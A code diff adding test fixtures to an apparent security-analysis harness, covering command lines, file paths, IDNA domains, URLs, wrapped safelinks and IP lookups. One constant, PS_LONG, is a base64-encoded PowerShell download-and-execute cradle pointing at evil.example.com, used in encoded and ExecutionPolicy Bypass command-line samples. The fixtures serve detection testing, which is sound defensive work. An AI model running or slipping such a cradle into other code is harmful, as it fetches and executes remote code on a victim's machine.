@@ -740,6 +740,155 @@ def dhash_runs():
     ]
 
 
+# 7.5 batch 3's observable values: (module, name, type, value, directives, relationships, extra args).
+# Each name is the dump's, under the module's directory. network_identifier reads
+# fixtures/values/local_networks.csv through networks.yaml, except for its last run, which has ace3's
+# own file, a header alone; protected_url_analyzer's 1drv.ms links are answered from
+# fixtures/values/one_drive, and one has nothing recorded, so its fetch fails.
+PS_SHORT = "VwByAGkAdABlAC0ASABvAHMAdAAgAGgAZQBsAGwAbwA="
+PS_LONG = (
+    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AH"
+    "IAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAGEALgBwAHMAMQAiACkAOwAgAEkARQBYACAA"
+    "KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgA"
+    "IgBoAHQAdABwADoALwAvAGUAdgBpAGwALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBhAC4AcABzADEAIgApADsAIAA="
+)
+URLSAFE_200 = (
+    "AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0-P0BBQkNERUZHSElKS0xNTk9QUVJTVFVW"
+    "V1hZWltcXV5fYGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6e3x9fn-AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6yt"
+    "rq-wsbKztLW2t7i5uru8vb6_wMHCw8TFxsc"
+)
+NETWORKS = ["--config", f"{REMOTE}/fixtures/values/networks.yaml"]
+ONE_DRIVE = ["--replay-http", f"{REMOTE}/fixtures/values/one_drive"]
+VALUE_RUNS = [
+    ("command_line_analyzer", "paths", "command_line",
+     r'cmd.exe /c "C:\Program Files\Acme Tool\run.exe" -o C:\Users\alice\AppData\Local\Temp\out.log \\fileserver\share\drop\x.dll',
+     [], [], []),
+    ("command_line_analyzer", "encoded_short", "command_line", f"powershell.exe -NoProfile -enc {PS_SHORT}", [], [], []),
+    ("command_line_analyzer", "encoded_dash", "command_line",
+     f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \u2013ExecutionPolicy Bypass \u2013EncodedCommand {PS_SHORT}",
+     [], [], []),
+    ("command_line_analyzer", "not_powershell", "command_line", f"docker run -e {PS_SHORT} alpine", [], [], []),
+    ("command_line_analyzer", "long_payload", "command_line", f"pwsh -c \"Invoke-Thing {PS_LONG}\"", [], [], []),
+    ("command_line_analyzer", "urlsafe", "command_line", f"loader.exe /data {URLSAFE_200} /quiet", [], [], []),
+    ("command_line_analyzer", "unbalanced", "command_line",
+     f"powershell -Command \"& 'C:\\Tools\\a b\\x.ps1' {PS_LONG}", [], [], []),
+    ("command_line_analyzer", "escaped_quotes", "command_line",
+     r'powershell.exe -Command "Start-Process \"C:\Program Files\Evil Corp\e.exe\" -ArgumentList \"\\srv\s\p q.txt\""',
+     [], [], []),
+    ("command_line_analyzer", "executed_on", "command_line",
+     r'"C:\Users\bob\Downloads\invoice.exe" /silent', ["collect_file"], [("executed_on", "hostname", "WS-0042")], []),
+    ("command_line_analyzer", "nothing", "command_line", "whoami /all", [], [], []),
+    ("command_line_analyzer", "prefix", "command_line",
+     r'cmd /c start "" "C:\Program Files\App\a.exe" & C:\Program Files\App\a.exe', [], [], []),
+    ("command_line_analyzer", "two_payloads", "command_line",
+     f"powershell -enc {PS_SHORT} -ec VwByAGkAdABlAC0ASABvAHMAdAAgAGIAeQBlAA==", [], [], []),
+    ("file_path_analysis", "user_path", "file_path", r"C:\Users\alice\AppData\Roaming\evil.exe", [], [], []),
+    ("file_path_analysis", "unix", "file_path", "/usr/local/bin/script.sh", [], [], []),
+    ("file_path_analysis", "bare_name", "file_path", "notes.txt", [], [], []),
+    ("file_path_analysis", "trailing_separator", "file_path", "c:\\USERS\\Bob Smith\\Desktop\\", [], [], []),
+    ("file_path_analysis", "unc", "file_path", r"\\server\share\dir\payload.dll", [], [], []),
+    ("file_path_analysis", "no_user_dir", "file_path", r"C:\Users\carol", [], [], []),
+    ("file_path_analysis", "forward_slashes", "file_path", "C:/Users/dan/file.txt", [], [], []),
+    ("file_path_analysis", "blank_user", "file_path", "C:\\Users\\  \\file.txt", [], [], []),
+    ("file_location_analysis", "windows", "file_location", r"WS-0042@C:\Windows\Temp\a.exe", [], [], []),
+    ("file_location_analysis", "two_ats", "file_location", "host@/var/tmp/x@y", [], [], []),
+    ("file_location_analysis", "spaces", "file_location", r" HOST @ C:\x", [], [], []),
+    ("email_address_fqdn_analyzer", "plain", "email_address", "alice@example.com", [], [], []),
+    ("email_address_fqdn_analyzer", "display_name", "email_address", '"Bob" <bob@Sub.Example.ORG>', [], [], []),
+    ("email_address_fqdn_analyzer", "two_ats", "email_address", "weird@@x.com", [], [], []),
+    ("email_address_fqdn_analyzer", "literal", "email_address", "user@[192.0.2.1]", [], [], []),
+    ("email_address_fqdn_analyzer", "email_from", "email_from", "carol@example.net", [], [], []),
+    ("email_address_fqdn_analyzer", "unicode", "email_address", "x@m\u00fcnchen.de", [], [], []),
+    ("idna_analyzer", "punycode", "fqdn", "xn--mnchen-3ya.de", [], [], []),
+    ("idna_analyzer", "unicode", "fqdn", "m\u00fcnchen.de", [], [], []),
+    ("idna_analyzer", "ascii", "fqdn", "example.com", [], [], []),
+    ("idna_analyzer", "bad_punycode", "fqdn", "xn--a.com", [], [], []),
+    ("idna_analyzer", "upper_ascii", "fqdn", "EXAMPLE.com", [], [], []),
+    ("idna_analyzer", "upper_unicode", "fqdn", "B\u00fccher.Example", [], [], []),
+    ("idna_analyzer", "sharp_s", "fqdn", "fa\u00df.de", [], [], []),
+    ("idna_analyzer", "sharp_s_punycode", "fqdn", "xn--fa-hia.de", [], [], []),
+    ("idna_analyzer", "snowman", "fqdn", "\u2603.net", [], [], []),
+    ("parse_url", "full", "url", "https://www.example.com/path/to?a=1&b=%20x+y#frag", [], [], []),
+    ("parse_url", "ipv4_port", "url", "http://192.0.2.10:8080/login", [], [], []),
+    ("parse_url", "host_first", "url", "yahoo.com/login", [], [], []),
+    ("parse_url", "host_port_first", "url", "yahoo.com:8080/login", [], [], []),
+    ("parse_url", "relative", "url", "/relative/path", [], [], []),
+    ("parse_url", "mailto", "url", "mailto:bob@example.com", [], [], []),
+    ("parse_url", "userinfo", "url", "https://user:pass@host.example.co.uk/", [], [], []),
+    ("parse_url", "localhost", "url", "https://localhost/x", [], [], []),
+    ("parse_url", "unicode", "url", "https://m\u00fcnchen.de/\u00fc?q=\u00e4", [], [], []),
+    ("parse_url", "ipv6", "url", "https://[2001:db8::1]/x", [], [], []),
+    ("parse_url", "bare_host", "url", "ftp://example.org", [], [], []),
+    ("parse_url", "word", "url", "example", [], [], []),
+    ("parse_url", "repeated_params", "url", "https://example.com/?a=1&a=2&b&c=%2B+", [], [], []),
+    ("parse_url", "ip_first", "url", "10.1.2.3/admin", [], [], []),
+    ("protected_url_analyzer", "egnyte", "url", "https://acme.egnyte.com/dl/AbCdEf/file.pdf", [], [], []),
+    ("protected_url_analyzer", "egnyte_other", "url", "https://acme.egnyte.com/fl/AbCdEf", [], [], []),
+    ("protected_url_analyzer", "fireeye", "url",
+     "https://protect2.fireeye.com/url?k=abc&u=https://evil.example.com/x", [], [], []),
+    ("protected_url_analyzer", "safelinks", "url",
+     "https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fevil.example.com%2Fpage&data=xyz",
+     ["crawl"], [], []),
+    ("protected_url_analyzer", "safelinks_no_host", "url",
+     "https://nam02.safelinks.protection.outlook.com/?url=https%3A..&data=xyz", [], [], []),
+    ("protected_url_analyzer", "dropbox_dl0", "url", "https://www.dropbox.com/s/abc/file.pdf?dl=0", [], [], []),
+    ("protected_url_analyzer", "dropbox_no_dl", "url", "https://www.dropbox.com/s/abc/file.pdf?x=1&x=2#top", [], [], []),
+    ("protected_url_analyzer", "dropbox_dl1", "url", "https://www.dropbox.com/s/abc/file.pdf?dl=1", [], [], []),
+    ("protected_url_analyzer", "sharepoint", "url",
+     "https://lahia-my.sharepoint.com/:b:/g/personal/secure_onedrivemsw_bid/EVdjoBiqZTxMnjAcDW6yR4gBqJ59ALkT1C2I3L0yb_n0uQ?e=naeXYD",
+     [], [], []),
+    ("protected_url_analyzer", "google_drive", "url",
+     "https://drive.google.com/file/d/1ls_eBCsmf3VG_e4dgQiSh_5VUM10b9s2/view?usp=sharing", [], [], []),
+    ("protected_url_analyzer", "urldefense_v3", "url",
+     "https://urldefense.com/v3/__https://evil.example.com/x__;!!AbC$", [], [], []),
+    ("protected_url_analyzer", "proofpoint_v2", "url",
+     "https://urldefense.proofpoint.com/v2/url?u=https-3A__evil.example.com_path&d=DwMF&c=x", [], [], []),
+    ("protected_url_analyzer", "cisco", "url",
+     "https://secure-web.cisco.com/1abcdef/https%3A%2F%2Fevil.example.com%2Fx", [], [], []),
+    ("protected_url_analyzer", "sophos", "url",
+     "https://eu-central-1.protection.sophos.com?d=x&u=aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL3g=&p=m", [], [], []),
+    ("protected_url_analyzer", "sophos_bad", "url",
+     "https://eu-central-1.protection.sophos.com?u=a", [], [], []),
+    ("protected_url_analyzer", "cudasvc", "url",
+     "https://linkprotect.cudasvc.com/url?a=https%3a%2f%2fevil.example.com%2fx&c=E,1", [], [], []),
+    ("protected_url_analyzer", "plain", "url", "https://www.example.com/", [], [], []),
+    ("protected_url_analyzer", "unparseable", "url", "http://[::1", [], [], []),
+    ("protected_url_analyzer", "one_drive", "url", "https://1drv.ms/b/s!AvqIO0JVRziVa0IWW7c6GG3YkdU", [], [], ONE_DRIVE),
+    ("protected_url_analyzer", "one_drive_no_params", "url", "https://1drv.ms/u/s!NoParams", [], [], ONE_DRIVE),
+    ("protected_url_analyzer", "one_drive_unreachable", "url", "https://1drv.ms/f/s!Missing", [], [], ONE_DRIVE),
+    ("network_identifier", "two_networks", "ip", "10.1.2.3", [], [], NETWORKS),
+    ("network_identifier", "subnet", "ip", "192.168.1.5", [], [], NETWORKS),
+    ("network_identifier", "single", "ipv4", "172.16.5.4", [], [], NETWORKS),
+    ("network_identifier", "none", "ip", "8.8.8.8", [], [], NETWORKS),
+    ("network_identifier", "ipv6", "ip", "2001:db8::5", [], [], NETWORKS),
+    ("network_identifier", "mapped", "ip", "::ffff:10.1.2.3", [], [], NETWORKS),
+    ("network_identifier", "scoped", "ip", "fe80::1%eth0", [], [], NETWORKS),
+    ("network_identifier", "default_file", "ip", "10.0.0.1", [], [], []),
+]
+
+
+def value_runs():
+    runs = []
+    for module, name, kind, value, directives, relationships, extra in VALUE_RUNS:
+        label = f"{kind} {value}"
+        if directives:
+            label += f" with {directives}"
+        for rel, other_kind, other_value in relationships:
+            label += f", {rel} {other_kind} {other_value}"
+        runs.append(
+            {
+                "module": module,
+                "enable": [],
+                "name": name,
+                "args": ["--observable", kind, value, *extra]
+                + [arg for d in directives for arg in ("--directive", d)]
+                + [arg for r in relationships for arg in ("--relationship", *r)],
+                "label": label,
+            }
+        )
+    return runs
+
+
 RUNS = {
     "email": lambda: file_runs("email_analyzer", ["file_type"], "email"),
     "archive": lambda: file_runs("archive", ["file_type"], "archive/"),
@@ -762,6 +911,7 @@ RUNS = {
     "x509": lambda: file_runs("x509_analyzer", ["file_type"], "x509") + file_runs("file_type", [], "x509"),
     "js": lambda: file_runs("file_type", [], "js"),
     "dhash": dhash_runs,
+    "values": value_runs,
 }
 
 
@@ -918,6 +1068,14 @@ def run(spec):
         "lnk_parser": "LnkParseAnalysis",
         "x509_analyzer": "X509Analysis",
         "dhash": "DHashImageAnalysis",
+        "command_line_analyzer": "CommandLineAnalysis",
+        "file_location_analysis": "FileLocationAnalysis",
+        "file_path_analysis": "FilePathAnalysis",
+        "network_identifier": "NetworkIdentifierAnalysis",
+        "parse_url": "ParseURLAnalysis",
+        "idna_analyzer": "IDNAAnalysis",
+        "email_address_fqdn_analyzer": "EmailAddressFQDNAnalysis",
+        "protected_url_analyzer": "ProtectedURLAnalysis",
     }[spec["module"]]
     analysis = next((a for a in parsed["analyses"] if a["class"] == target_class), None)
     return {
